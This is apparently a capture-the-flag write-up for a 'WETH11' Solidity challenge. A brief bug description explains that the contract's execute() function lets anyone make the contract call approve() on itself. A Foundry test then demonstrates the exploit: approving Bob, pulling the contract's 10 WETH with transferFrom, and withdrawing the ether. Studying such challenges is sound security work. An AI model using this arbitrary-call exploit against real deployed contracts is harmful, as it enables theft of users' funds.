# Bug:
The function `execute()` can be used to call functions like `ERC20.approve()` with the `msg.sender` being itself, as long as the loan amount is 0. Bob can call the `approve()` to get back the tokens and then withdraw.


# POC (Foundry)
```solidity
// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../src/WETH11.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);
        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!

		bytes memory data = abi.encodeWithSignature(
			"approve(address,uint256)",
			bob,
			10 ether
		);

		weth.execute(address(weth), 0, data);

		weth.transferFrom(address(weth), bob, 10 ether);

		weth.withdraw(10 ether);

		// -----

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}

```

